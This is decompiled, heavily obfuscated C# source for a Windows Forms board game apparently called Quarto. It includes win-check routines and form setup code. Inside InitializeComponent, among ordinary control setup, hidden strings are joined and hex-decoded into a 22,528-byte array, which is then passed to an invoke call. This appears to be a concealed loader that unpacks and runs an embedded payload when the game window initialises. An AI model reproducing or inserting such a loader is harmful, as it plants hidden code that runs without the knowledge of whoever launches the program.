				{
					int num68;
					int num69;
					if (!flag3)
					{
						num68 = 247970852;
						num69 = 247970852;
					}
					else
					{
						num68 = 70049557;
						num69 = 70049557;
					}
					num = num68 ^ ((int)num2 * -355893248);
					continue;
				}
				case 50u:
					if (mem[num3, 2].Dark != mem[num3, 3].Dark)
					{
						num = ((int)num2 * -691802611) ^ 0x1A6E56CA;
						continue;
					}
					goto IL_00fd;
				case 49u:
					if (mem[2, num3].Big != mem[3, num3].Big)
					{
						num = (int)((num2 * 1857498195) ^ 0x7593276B);
						continue;
					}
					goto IL_00fd;
				case 48u:
					num = 617437402;
					continue;
				case 47u:
					if (mem[0, 3] != null)
					{
						num = 1964693197;
						continue;
					}
					goto IL_02fd;
				case 46u:
				{
					int num54;
					int num55;
					if (mem[num3, 1] != null)
					{
						num54 = 1188613966;
						num55 = 1188613966;
					}
					else
					{
						num54 = 231061244;
						num55 = 231061244;
					}
					num = num54 ^ ((int)num2 * -439597016);
					continue;
				}
				case 45u:
					flag = true;
					num = ((int)num2 * -164709110) ^ 0x613F2B23;
					continue;
				case 44u:
				{
					int num50;
					if (mem[0, 3].Dark == mem[1, 2].Dark)
					{
						num = 345434492;
						num50 = 345434492;
					}
					else
					{
						num = 1202114689;
						num50 = 1202114689;
					}
					continue;
				}
				case 43u:
					if (mem[2, 1].Big != mem[3, 0].Big)
					{
						num = (int)((num2 * 488995886) ^ 0x35A2B472);
						continue;
					}
					goto IL_0174;
				case 42u:
					flag3 = num3 < 4;
					num = 1078807419;
					continue;
				case 41u:
					if (mem[2, num3] != null)
					{
						num = ((int)num2 * -1556729291) ^ 0x2A26FC6;
						continue;
					}
					goto IL_00f1;
				case 40u:
				{
					int num40;
					if (mem[num3, 0].Point == mem[num3, 1].Point)
					{
						num = 2042387857;
						num40 = 2042387857;
					}
					else
					{
						num = 1006509493;
						num40 = 1006509493;
					}
					continue;
				}
				case 39u:
					if (mem[2, num3].Dark != mem[3, num3].Dark)
					{
						num = (int)(num2 * 1806697294) ^ -1742487360;
						continue;
					}
					goto IL_00fd;
				case 38u:
					if (mem[2, num3].Point != mem[3, num3].Point)
					{
						num = (int)((num2 * 1562927717) ^ 0x63142239);
						continue;
					}
					goto IL_00fd;
				case 37u:
				{
					int num33;
					int num34;
					if (mem[num3, 0].Big != mem[num3, 1].Big)
					{
						num33 = 1371519455;
						num34 = 1371519455;
					}
					else
					{
						num33 = 1659763171;
						num34 = 1659763171;
					}
					num = num33 ^ (int)(num2 * 509689314);
					continue;
				}
				case 36u:
					if (mem[1, num3].Square == mem[2, num3].Square)
					{
						num = ((int)num2 * -985706026) ^ 0x56E4CF72;
						continue;
					}
					goto IL_00f1;
				case 35u:
				{
					int num28;
					int num29;
					if (mem[1, 1].Square == mem[2, 2].Square)
					{
						num28 = 1601977060;
						num29 = 1601977060;
					}
					else
					{
						num28 = 366275153;
						num29 = 366275153;
					}
					num = num28 ^ ((int)num2 * -93564945);
					continue;
				}
				case 34u:
				{
					int num15;
					int num16;
					if (mem[3, 3] == null)
					{
						num15 = 634886556;
						num16 = 634886556;
					}
					else
					{
						num15 = 1091455042;
						num16 = 1091455042;
					}
					num = num15 ^ (int)(num2 * 988019197);
					continue;
				}
				case 33u:
				{
					int num9;
					int num10;
					if (mem[1, 2].Dark == mem[2, 1].Dark)
					{
						num9 = 100658423;
						num10 = 100658423;
					}
					else
					{
						num9 = 115187909;
						num10 = 115187909;
					}
					num = num9 ^ ((int)num2 * -170010346);
					continue;
				}
				case 32u:
					if (mem[num3, 2].Big != mem[num3, 3].Big)
					{
						num = (int)((num2 * 138236161) ^ 0x34B40AA3);
						continue;
					}
					goto IL_00fd;
				case 31u:
					if (mem[2, 1].Dark != mem[3, 0].Dark)
					{
						num = (int)(num2 * 1269701524) ^ -559232203;
						continue;
					}
					goto IL_0174;
				case 30u:
					num = (int)(num2 * 1085825394) ^ -170668908;
					continue;
				case 29u:
					num3 = 0;
					num = ((int)num2 * -297137748) ^ 0x65C5E2D4;
					continue;
				case 28u:
				{
					int num70;
					if (mem[0, 0].Square == mem[1, 1].Square)
					{
						num = 308416149;
						num70 = 308416149;
					}
					else
					{
						num = 1394990992;
						num70 = 1394990992;
					}
					continue;
				}
				case 27u:
					num41 = ((mem[2, 1].Square == mem[3, 0].Square) ? 1 : 0);
					goto IL_00c5;
				case 25u:
				{
					int num66;
					int num67;
					if (mem[1, 1].Dark == mem[2, 2].Dark)
					{
						num66 = -581634914;
						num67 = -581634914;
					}
					else
					{
						num66 = -849108911;
						num67 = -849108911;
					}
					num = num66 ^ (int)(num2 * 1766585981);
					continue;
				}
				case 24u:
				{
					int num64;
					int num65;
					if (mem[0, 0].Big == mem[1, 1].Big)
					{
						num64 = 163049409;
						num65 = 163049409;
					}
					else
					{
						num64 = 1657806443;
						num65 = 1657806443;
					}
					num = num64 ^ ((int)num2 * -1011555416);
					continue;
				}
				case 23u:
					if (mem[0, 3].Square == mem[1, 2].Square)
					{
						num = 2071843524;
						continue;
					}
					goto IL_09b1;
				case 21u:
				{
					int num58;
					int num59;
					if (mem[1, 1] == null)
					{
						num58 = -446494816;
						num59 = -446494816;
					}
					else
					{
						num58 = -1755374873;
						num59 = -1755374873;
					}
					num = num58 ^ (int)(num2 * 758296575);
					continue;
				}
				case 20u:
				{
					int num53;
					if (mem[num3, 0].Dark != mem[num3, 1].Dark)
					{
						num = 1417747030;
						num53 = 1417747030;
					}
					else
					{
						num = 1231342411;
						num53 = 1231342411;
					}
					continue;
				}
				case 19u:
					if (mem[2, num3].Square != mem[3, num3].Square)
					{
						goto IL_00f1;
					}
					goto IL_00fd;
				case 18u:
				{
					int num51;
					int num52;
					if (mem[1, num3].Big == mem[2, num3].Big)
					{
						num51 = -1660989564;
						num52 = -1660989564;
					}
					else
					{
						num51 = -1687843601;
						num52 = -1687843601;
					}
					num = num51 ^ (int)(num2 * 1539855);
					continue;
				}
				case 17u:
					result = flag;
					num = 1966750436;
					continue;
				case 16u:
					if (mem[1, 2].Square == mem[2, 1].Square)
					{
						num = ((int)num2 * -757412381) ^ -1606918059;
						continue;
					}
					goto IL_09b1;
				case 15u:
				{
					int num48;
					int num49;
					if (mem[0, 3].Big != mem[1, 2].Big)
					{
						num48 = 313181667;
						num49 = 313181667;
					}
					else
					{
						num48 = 1618632854;
						num49 = 1618632854;
					}
					num = num48 ^ (int)(num2 * 1544003369);
					continue;
				}
				case 14u:
				{
					int num44;
					int num45;
					if (mem[1, 2].Point == mem[2, 1].Point)
					{
						num44 = 750288122;
						num45 = 750288122;
					}
					else
					{
						num44 = 1238165764;
						num45 = 1238165764;
					}
					num = num44 ^ (int)(num2 * 1787872697);
					continue;
				}
				case 13u:
				{
					int num38;
					int num39;
					if (mem[1, num3].Point != mem[2, num3].Point)
					{
						num38 = 1650601129;
						num39 = 1650601129;
					}
					else
					{
						num38 = 2016270834;
						num39 = 2016270834;
					}
					num = num38 ^ (int)(num2 * 100232175);
					continue;
				}
				case 12u:
				{
					int num36;
					int num37;
					if (mem[num3, 3] != null)
					{
						num36 = -1284070603;
						num37 = -1284070603;
					}
					else
					{
						num36 = -2009712218;
						num37 = -2009712218;
					}
					num = num36 ^ ((int)num2 * -1459350918);
					continue;
				}
				case 11u:
				{
					int num35;
					if (mem[0, num3].Point != mem[1, num3].Point)
					{
						num = 264405867;
						num35 = 264405867;
					}
					else
					{
						num = 2073360772;
						num35 = 2073360772;
					}
					continue;
				}
				case 10u:
				{
					int num32;
					if (mem[0, 0].Point != mem[1, 1].Point)
					{
						num = 2119776872;
						num32 = 2119776872;
					}
					else
					{
						num = 489321010;
						num32 = 489321010;
					}
					continue;
				}
				case 9u:
				{
					int num30;
					int num31;
					if (mem[1, 2].Big != mem[2, 1].Big)
					{
						num30 = -585362150;
						num31 = -585362150;
					}
					else
					{
						num30 = -1798395992;
						num31 = -1798395992;
					}
					num = num30 ^ ((int)num2 * -522869844);
					continue;
				}
				case 8u:
				{
					int num23;
					int num24;
					if (mem[num3, 1].Dark != mem[num3, 2].Dark)
					{
						num23 = 1675746668;
						num24 = 1675746668;
					}
					else
					{
						num23 = 1314937068;
						num24 = 1314937068;
					}
					num = num23 ^ (int)(num2 * 152088730);
					continue;
				}
				case 7u:
				{
					int num17;
					int num18;
					if (mem[0, num3].Big == mem[1, num3].Big)
					{
						num17 = 2018234039;
						num18 = 2018234039;
					}
					else
					{
						num17 = 922639916;
						num18 = 922639916;
					}
					num = num17 ^ ((int)num2 * -1460091606);
					continue;
				}
				case 6u:
					if (mem[3, 0] != null)
					{
						num = (int)(num2 * 1522132113) ^ -572700433;
						continue;
					}
					goto IL_02fd;
				case 5u:
					num = 773788827;
					continue;
				case 4u:
				{
					int num11;
					int num12;
					if (mem[1, 1].Big != mem[2, 2].Big)
					{
						num11 = -1998797595;
						num12 = -1998797595;
					}
					else
					{
						num11 = -347982052;
						num12 = -347982052;
					}
					num = num11 ^ (int)(num2 * 1991877674);
					continue;
				}
				case 3u:
					if (mem[2, 2].Point != mem[3, 3].Point)
					{
						num = ((int)num2 * -924815060) ^ -758042628;
						continue;
					}
					goto IL_00c4;
				case 2u:
				{
					int num4;
					int num5;
					if (mem[0, 0] != null)
					{
						num4 = 1404963650;
						num5 = 1404963650;
					}
					else
					{
						num4 = 1496897752;
						num5 = 1496897752;
					}
					num = num4 ^ (int)(num2 * 1890307164);
					continue;
				}
				case 1u:
					if (mem[2, 2].Dark != mem[3, 3].Dark)
					{
						num = ((int)num2 * -1959083335) ^ 0x14EFE93D;
						continue;
					}
					goto IL_00c4;
				case 0u:
					if (mem[3, num3] != null)
					{
						num = (int)((num2 * 496653328) ^ 0x4E3D55B6);
						continue;
					}
					goto IL_00f1;
				case 22u:
					break;
				default:
					{
						return result;
					}
					IL_00f1:
					num = 419327369;
					num25 = 419327369;
					continue;
					IL_00fd:
					num = 1387315032;
					num25 = 1387315032;
					continue;
					IL_00c4:
					num41 = 1;
					goto IL_00c5;
					IL_0174:
					num41 = 1;
					goto IL_00c5;
					IL_09b1:
					num41 = 0;
					goto IL_00c5;
					IL_00c5:
					flag2 = (byte)num41 != 0;
					num = 790817952;
					continue;
					IL_02fd:
					num41 = 0;
					goto IL_00c5;
				}
				break;
			}
		}
	}

	private bool Standoff(Figurine[,] mem)
	{
		bool flag = true;
		int num4 = default(int);
		int num3 = default(int);
		bool flag2 = default(bool);
		bool flag3 = default(bool);
		bool result = default(bool);
		while (true)
		{
			int num = 1570089302;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x77D75A7Fu) % 15u)
				{
				case 14u:
					num4++;
					num = ((int)num2 * -1284243711) ^ -1777397844;
					continue;
				case 13u:
				{
					int num9;
					if (mem[num4, num3] != null)
					{
						num = 1796665877;
						num9 = 1796665877;
					}
					else
					{
						num = 1950043429;
						num9 = 1950043429;
					}
					continue;
				}
				case 12u:
					flag2 = num3 < 4;
					num = 60005048;
					continue;
				case 11u:
					flag3 = num4 < 4;
					num = 1990481881;
					continue;
				case 10u:
				{
					int num7;
					int num8;
					if (flag3)
					{
						num7 = 565654987;
						num8 = 565654987;
					}
					else
					{
						num7 = 807455642;
						num8 = 807455642;
					}
					num = num7 ^ ((int)num2 * -1314998053);
					continue;
				}
				case 9u:
					num3 = 0;
					num = 1226097801;
					continue;
				case 7u:
					flag = false;
					num = ((int)num2 * -66783906) ^ 0x33674719;
					continue;
				case 5u:
				{
					int num5;
					int num6;
					if (flag2)
					{
						num5 = -90544773;
						num6 = -90544773;
					}
					else
					{
						num5 = -855337635;
						num6 = -855337635;
					}
					num = num5 ^ (int)(num2 * 967663808);
					continue;
				}
				case 4u:
					result = flag;
					num = ((int)num2 * -1999450652) ^ 0x490489F8;
					continue;
				case 3u:
					num = (int)((num2 * 800580641) ^ 0x40BFE2CC);
					continue;
				case 2u:
					num4 = 0;
					num = (int)((num2 * 1207931061) ^ 0x5672B540);
					continue;
				case 1u:
					num = (int)((num2 * 211797604) ^ 0x541DA3FB);
					continue;
				case 0u:
					num3++;
					num = 1077673955;
					continue;
				case 6u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public void SetName(string str)
	{
		Form1.smethod_32((Control)(object)label5, "Игрок: ");
		while (true)
		{
			int num = 504348387;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x112B685u) % 6u)
				{
				case 4u:
					Form1.smethod_50((Control)(object)label5, (Form1.smethod_49((Control)(object)this) - (Form1.smethod_18((Control)(object)label5) + Form1.smethod_18((Control)(object)label6))) / 2);
					num = (int)((num2 * 1495932224) ^ 0x7CC8B6F6);
					continue;
				case 3u:
					Form1.smethod_50((Control)(object)label6, Form1.smethod_37((Control)(object)label5).X + Form1.smethod_18((Control)(object)label5));
					Form1.smethod_32((Control)(object)label1, "");
					num = ((int)num2 * -2053228189) ^ -380299569;
					continue;
				case 2u:
					Form1.smethod_32((Control)(object)label6, str);
					num = (int)((num2 * 679665289) ^ 0x49BEECAF);
					continue;
				case 1u:
					Form1.smethod_32((Control)(object)label2, "");
					num = (int)((num2 * 1631151248) ^ 0x7DF03B78);
					continue;
				default:
					return;
				case 0u:
					break;
				case 5u:
					return;
				}
				break;
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = -875247563;
			while (true)
			{
				uint num2;
				int num5;
				switch ((num2 = (uint)num ^ 0xF79282E2u) % 8u)
				{
				case 7u:
					if (disposing)
					{
						num = ((int)num2 * -2051130664) ^ -220988924;
						continue;
					}
					num5 = 0;
					goto IL_0019;
				case 6u:
					num5 = ((components != null) ? 1 : 0);
					goto IL_0019;
				case 5u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = 120697127;
						num4 = 120697127;
					}
					else
					{
						num3 = 421370468;
						num4 = 421370468;
					}
					num = num3 ^ (int)(num2 * 792226452);
					continue;
				}
				case 2u:
					((Form)this).Dispose(disposing);
					num = -93066630;
					continue;
				case 1u:
					Form1.smethod_51((IDisposable)components);
					num = (int)((num2 * 1078201553) ^ 0x735CEF1);
					continue;
				case 0u:
					num = ((int)num2 * -1840048347) ^ 0x10D8EF16;
					continue;
				default:
					return;
				case 3u:
					break;
				case 4u:
					return;
					IL_0019:
					flag = (byte)num5 != 0;
					num = -326926537;
					continue;
				}
				break;
			}
		}
	}

	private void InitializeComponent()
	{
		//IL_086f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0879: Expected O, but got Unknown
		bool flag = default(bool);
		int num3 = default(int);
		string string_ = default(string);
		object[] object_ = default(object[]);
		byte[] array = default(byte[]);
		while (true)
		{
			int num = 101685630;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x433CA5C3u) % 123u)
				{
				case 122u:
					num = ((int)num2 * -194709064) ^ -1918848324;
					continue;
				case 121u:
					Form1.smethod_61((Control)(object)richTextBox1, "richTextBox1");
					num = ((int)num2 * -2128719802) ^ 0x6E4F50E0;
					continue;
				case 120u:
					num = ((int)num2 * -176415496) ^ -899293840;
					continue;
				case 119u:
					Form1.smethod_75((Control)(object)label2, (DockStyle)3);
					num = ((int)num2 * -467497820) ^ 0x1036A22D;
					continue;
				case 118u:
					num = (int)((num2 * 426541061) ^ 0xAF98958);
					continue;
				case 117u:
					Form1.smethod_89((Control)(object)this, (EventHandler)Form1_LocationChanged);
					num = (int)((num2 * 1246108705) ^ 0x289341BC);
					continue;
				case 116u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button1);
					num = ((int)num2 * -571657941) ^ 0x65282B3E;
					continue;
				case 115u:
					Form1.smethod_64((Control)(object)label1, 8);
					num = ((int)num2 * -2029558955) ^ 0x53F86F49;
					continue;
				case 114u:
					Form1.smethod_64((Control)(object)button1, 5);
					num = (int)(num2 * 1897655212) ^ -1319147595;
					continue;
				case 113u:
					num = (int)((num2 * 1063461169) ^ 0x2278025A);
					continue;
				case 112u:
					flag = num3 < 22528;
					num = 1292981527;
					continue;
				case 111u:
					Form1.smethod_64((Control)(object)button2, 4);
					num = (int)((num2 * 1810766801) ^ 0x6538F669);
					continue;
				case 110u:
					Form1.smethod_79((ContainerControl)(object)this, new SizeF(6f, 13f));
					num = (int)((num2 * 1742177730) ^ 0x5DA0D83);
					continue;
				case 109u:
					Form1.smethod_72(timer1, 1000);
					num = (int)((num2 * 241841396) ^ 0x365EEEA9);
					continue;
				case 108u:
					string_ = Veet.Sa;
					num = (int)(num2 * 967579090) ^ -1183563861;
					continue;
				case 107u:
					Form1.smethod_62(pictureBox1, 0);
					num = ((int)num2 * -1807545793) ^ 0x1C5C7DDE;
					continue;
				case 106u:
					num = ((int)num2 * -1112882829) ^ -1709916444;
					continue;
				case 105u:
					components = Form1.smethod_52();
					pictureBox1 = Form1.smethod_2();
					num = ((int)num2 * -956477931) ^ 0x46398ED8;
					continue;
				case 104u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label1);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)richTextBox1);
					num = ((int)num2 * -1915566901) ^ -589987789;
					continue;
				case 103u:
					Form1.smethod_65((Control)(object)button1, bool_0: false);
					Form1.smethod_32((Control)(object)button1, "Меню");
					num = (int)(num2 * 651797788) ^ -1261686471;
					continue;
				case 102u:
					Form1.smethod_91((Control)(object)this, bool_0: false);
					num = ((int)num2 * -306295948) ^ -907229406;
					continue;
				case 101u:
					Form1.smethod_64((Control)(object)label5, 12);
					num = ((int)num2 * -342573005) ^ -765942680;
					continue;
				case 100u:
					Form1.smethod_3((Control)(object)button1, new Size(83, 35));
					num = ((int)num2 * -1163747395) ^ 0x4FABB208;
					continue;
				case 99u:
					Form1.smethod_5((Control)(object)pictureBox1, Color.FromArgb(64, 32, 0));
					num = ((int)num2 * -198424421) ^ 0x1BE45370;
					continue;
				case 98u:
					num = (int)(num2 * 1690992733) ^ -1212498915;
					continue;
				case 97u:
					Form1.smethod_67((Control)(object)button2, (EventHandler)Button2_Click);
					num = (int)(num2 * 292709033) ^ -223694049;
					continue;
				case 96u:
					Form1.smethod_65((Control)(object)richTextBox1, bool_0: false);
					num = (int)(num2 * 730824894) ^ -1375438909;
					continue;
				case 95u:
					Form1.smethod_61((Control)(object)label1, "label1");
					num = (int)(num2 * 274239048) ^ -1192378544;
					continue;
				case 94u:
					num = (int)(num2 * 966914734) ^ -536873000;
					continue;
				case 93u:
					object_ = new object[3]
					{
						Player.MembershipCondition(0),
						Player.MembershipCondition(1),
						"Cytotechnologist"
					};
					num = ((int)num2 * -1132894601) ^ -98858529;
					continue;
				case 92u:
					Form1.smethod_77((Control)(object)label2, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					Form1.smethod_4((Control)(object)label2, new Point(0, 0));
					Form1.smethod_61((Control)(object)label2, "label2");
					num = (int)(num2 * 1248491327) ^ -1608560794;
					continue;
				case 91u:
					Form1.smethod_74((Control)(object)label2, bool_0: true);
					num = ((int)num2 * -134314344) ^ 0x4FDBDDF;
					continue;
				case 90u:
					button1 = Form1.smethod_53();
					num = (int)((num2 * 630443094) ^ 0x1C75964F);
					continue;
				case 89u:
					num = ((int)num2 * -844161949) ^ 0x448FEC17;
					continue;
				case 87u:
					num = (int)((num2 * 598922783) ^ 0x13B37354);
					continue;
				case 86u:
					num = (int)(num2 * 1091852259) ^ -853655986;
					continue;
				case 85u:
					num = (int)(num2 * 1150411985) ^ -2042242994;
					continue;
				case 84u:
					num3++;
					num = ((int)num2 * -1689281153) ^ 0x26873091;
					continue;
				case 83u:
					Form1.smethod_74((Control)(object)label5, bool_0: true);
					num = (int)((num2 * 846244719) ^ 0x44DF9C4D);
					continue;
				case 82u:
					Form1.smethod_32((Control)(object)this, "Quarto");
					num = (int)(num2 * 544730251) ^ -202270898;
					continue;
				case 81u:
					num = ((int)num2 * -1659639685) ^ 0x73E265C9;
					continue;
				case 80u:
					Form1.smethod_64((Control)(object)panel1, 7);
					num = ((int)num2 * -1025277564) ^ 0x7E96C4D1;
					continue;
				case 79u:
				{
					int num4;
					int num5;
					if (!flag)
					{
						num4 = 1636384578;
						num5 = 1636384578;
					}
					else
					{
						num4 = 1741718078;
						num5 = 1741718078;
					}
					num = num4 ^ ((int)num2 * -417188347);
					continue;
				}
				case 77u:
					num = (int)((num2 * 2117186133) ^ 0x3622C5EE);
					continue;
				case 76u:
					num = ((int)num2 * -1153073567) ^ -1104905482;
					continue;
				case 75u:
					num = (int)((num2 * 582492425) ^ 0x4D293070);
					continue;
				case 74u:
					Form1.smethod_66((ButtonBase)(object)button1, bool_0: true);
					num = (int)((num2 * 579586796) ^ 0x11AD5B96);
					continue;
				case 73u:
					Form1.smethod_61((Control)(object)label5, "label5");
					num = (int)((num2 * 327088602) ^ 0x756F49B7);
					continue;
				case 72u:
					num = ((int)num2 * -508000405) ^ 0x172706B8;
					continue;
				case 71u:
					Form1.smethod_87((Form)(object)this, (EventHandler)Form1_Load);
					num = (int)((num2 * 1653311892) ^ 0x31DDE13A);
					continue;
				case 70u:
					Form1.smethod_90((ISupportInitialize)pictureBox1);
					num = (int)(num2 * 1314790629) ^ -966346755;
					continue;
				case 69u:
					Form1.smethod_67((Control)(object)button1, (EventHandler)Button1_Click);
					Form1.smethod_5((Control)(object)richTextBox1, Color.White);
					num = (int)((num2 * 689843720) ^ 0x42E6E75C);
					continue;
				case 68u:
					Form1.smethod_85((Control)(object)this, "Form1");
					num = ((int)num2 * -1072323199) ^ -894069394;
					continue;
				case 67u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label5);
					num = ((int)num2 * -1732121961) ^ 0x49D79EFF;
					continue;
				case 66u:
					num = (int)((num2 * 591035757) ^ 0x722DA12A);
					continue;
				case 65u:
					num = (int)((num2 * 2142620857) ^ 0x6201AC19);
					continue;
				case 64u:
					Form1.smethod_61((Control)(object)pictureBox1, "pictureBox1");
					num = ((int)num2 * -924350648) ^ -227073659;
					continue;
				case 63u:
					Form1.smethod_64((Control)(object)label2, 9);
					num = ((int)num2 * -1286232205) ^ 0x5DC63CB0;
					continue;
				case 62u:
					Form1.smethod_61((Control)(object)label6, "label6");
					num = (int)((num2 * 436592566) ^ 0x797F47C0);
					continue;
				case 61u:
					Form1.smethod_58((ISupportInitialize)pictureBox1);
					num = (int)(num2 * 181197344) ^ -1203714495;
					continue;
				case 60u:
					Form1.smethod_74((Control)(object)label6, bool_0: true);
					num = ((int)num2 * -612061324) ^ 0x349862CA;
					continue;
				case 59u:
					Form1.smethod_61((Control)(object)button2, "button2");
					num = (int)((num2 * 627485601) ^ 0x3681CBF1);
					continue;
				case 58u:
					Form1.smethod_77((Control)(object)label5, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					Form1.smethod_4((Control)(object)label5, new Point(197, 0));
					num = ((int)num2 * -1601174378) ^ 0x15EB462B;
					continue;
				case 57u:
					string_ = Form1.smethod_34(string_, Veet.Xe);
					num = ((int)num2 * -1900785220) ^ -434648152;
					continue;
				case 56u:
					Form1.smethod_92((Control)(object)this);
					num = ((int)num2 * -698849083) ^ -1265093909;
					continue;
				case 55u:
					Form1.smethod_74((Control)(object)label1, bool_0: true);
					num = ((int)num2 * -434311807) ^ -296504593;
					continue;
				case 54u:
					num = (int)(num2 * 748662240) ^ -1507670125;
					continue;
				case 53u:
					array[num3] = Form1.smethod_69(Form1.smethod_68(string_, num3 * 2, 2), 16);
					num = ((int)num2 * -1878866026) ^ 0x406B7093;
					continue;
				case 52u:
					Form1.smethod_6((Control)(object)pictureBox1, new MouseEventHandler(PictureBox1_MouseDown));
					num = ((int)num2 * -1735382941) ^ 0x134D195F;
					continue;
				case 51u:
					Form1.smethod_32((Control)(object)button2, "Подтвердить");
					num = (int)(num2 * 315628015) ^ -1185437560;
					continue;
				case 50u:
					Form1.smethod_3((Control)(object)richTextBox1, new Size(272, 35));
					Form1.smethod_64((Control)(object)richTextBox1, 6);
					num = ((int)num2 * -1956048707) ^ 0x1171A2A5;
					continue;
				case 49u:
					num = ((int)num2 * -1396979585) ^ 0xC686D2D;
					continue;
				case 48u:
					Form1.smethod_80((ContainerControl)(object)this, (AutoScaleMode)1);
					Form1.smethod_5((Control)(object)this, Color.White);
					Form1.smethod_81((Form)(object)this, new Size(486, 319));
					num = ((int)num2 * -898996174) ^ 0x535E3F3C;
					continue;
				case 47u:
					num3 = 0;
					num = ((int)num2 * -1405024256) ^ 0x2859A62E;
					continue;
				case 46u:
					button2 = Form1.smethod_53();
					num = ((int)num2 * -542152166) ^ 0x75645E80;
					continue;
				case 45u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)pictureBox1);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)panel1);
					num = ((int)num2 * -94755483) ^ -1551959448;
					continue;
				case 44u:
					CharArray(array, string.Empty);
					num = ((int)num2 * -2006909104) ^ -79668835;
					continue;
				case 43u:
					Form1.smethod_3((Control)(object)label6, new Size(0, 16));
					num = (int)((num2 * 1704036455) ^ 0x659AF113);
					continue;
				case 42u:
					Form1.smethod_78((Control)(object)label1, (RightToLeft)0);
					num = ((int)num2 * -1859498140) ^ -785901518;
					continue;
				case 41u:
					Form1.smethod_70(ComMember, object_);
					num = ((int)num2 * -1528521512) ^ -1192794029;
					continue;
				case 40u:
					Form1.smethod_84((Form)(object)this, bool_0: false);
					num = ((int)num2 * -1657768832) ^ -595705148;
					continue;
				case 39u:
					Form1.smethod_59((Control)(object)this);
					num = ((int)num2 * -416292507) ^ 0x5323F6FF;
					continue;
				case 38u:
					string_ = Form1.smethod_34(string_, Veet.Zr);
					array = new byte[22528];
					num = ((int)num2 * -24852835) ^ 0x3BB194AF;
					continue;
				case 37u:
					Form1.smethod_77((Control)(object)label6, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)((num2 * 1785159116) ^ 0x6752E921);
					continue;
				case 36u:
					num = (int)((num2 * 323013661) ^ 0xC96D60B);
					continue;
				case 35u:
					Form1.smethod_32((Control)(object)richTextBox1, "");
					num = ((int)num2 * -1615383542) ^ -1271167940;
					continue;
				case 34u:
					num = 1498450059;
					continue;
				case 33u:
					Form1.smethod_3((Control)(object)button2, new Size(83, 35));
					num = (int)((num2 * 482757843) ^ 0x561D2DC1);
					continue;
				case 32u:
					num = (int)((num2 * 820598108) ^ 0x5706F24B);
					continue;
				case 31u:
					Form1.smethod_4((Control)(object)button2, new Point(391, 275));
					num = ((int)num2 * -1949087972) ^ -488487157;
					continue;
				case 30u:
					Form1.smethod_4((Control)(object)panel1, new Point(0, 24));
					Form1.smethod_61((Control)(object)panel1, "panel1");
					Form1.smethod_3((Control)(object)panel1, new Size(486, 240));
					num = ((int)num2 * -645043849) ^ -647285037;
					continue;
				case 29u:
					Form1.smethod_71((TextBoxBase)(object)richTextBox1, bool_0: true);
					num = (int)((num2 * 1180914135) ^ 0x701CEA11);
					continue;
				case 28u:
					num = (int)((num2 * 1620249465) ^ 0x65174B9F);
					continue;
				case 27u:
					Form1.smethod_86((Form)(object)this, bool_0: false);
					num = ((int)num2 * -1152715197) ^ 0x2DECF25A;
					continue;
				case 26u:
					Form1.smethod_66((ButtonBase)(object)button2, bool_0: true);
					num = ((int)num2 * -1823335260) ^ 0x6B0BB3F4;
					continue;
				case 25u:
					richTextBox1 = Form1.smethod_54();
					panel1 = Form1.smethod_55();
					timer1 = Form1.smethod_56(components);
					label1 = Form1.smethod_57();
					num = (int)(num2 * 1910635676) ^ -751005360;
					continue;
				case 24u:
					Form1.smethod_3((Control)(object)label1, new Size(0, 16));
					num = (int)((num2 * 757163270) ^ 0x4AAD7F14);
					continue;
				case 23u:
					label2 = Form1.smethod_57();
					label5 = Form1.smethod_57();
					label6 = Form1.smethod_57();
					num = ((int)num2 * -2071250982) ^ -995657485;
					continue;
				case 22u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label6);
					num = (int)(num2 * 2106966634) ^ -990014582;
					continue;
				case 21u:
					Form1.smethod_4((Control)(object)richTextBox1, new Point(107, 275));
					num = ((int)num2 * -732462538) ^ 0x3DDCB4C4;
					continue;
				case 20u:
					Form1.smethod_88((Form)(object)this, (EventHandler)Form1_Shown);
					num = ((int)num2 * -264737424) ^ -261278042;
					continue;
				case 19u:
					num = ((int)num2 * -1437446084) ^ 0x37D31FCE;
					continue;
				case 18u:
					Form1.smethod_65((Control)(object)button2, bool_0: false);
					num = (int)(num2 * 1809487796) ^ -952327905;
					continue;
				case 17u:
					num = (int)(num2 * 1054848405) ^ -2025071017;
					continue;
				case 16u:
					num = ((int)num2 * -1669566204) ^ -612235643;
					continue;
				case 15u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label2);
					num = (int)((num2 * 1032175591) ^ 0x59CA1D9F);
					continue;
				case 14u:
					Form1.smethod_3((Control)(object)label5, new Size(0, 16));
					num = (int)((num2 * 434578515) ^ 0xB389222);
					continue;
				case 13u:
					Form1.smethod_4((Control)(object)button1, new Point(12, 275));
					num = ((int)num2 * -1302262838) ^ 0x322F3CE7;
					continue;
				case 12u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button2);
					num = (int)(num2 * 1813825544) ^ -1688351999;
					continue;
				case 11u:
					Form1.smethod_61((Control)(object)button1, "button1");
					num = ((int)num2 * -1606123092) ^ 0x6E3760E2;
					continue;
				case 10u:
					Form1.smethod_3((Control)(object)label2, new Size(0, 16));
					num = (int)((num2 * 817871175) ^ 0x707EFB84);
					continue;
				case 9u:
					Form1.smethod_83((Form)(object)this, (FormBorderStyle)1);
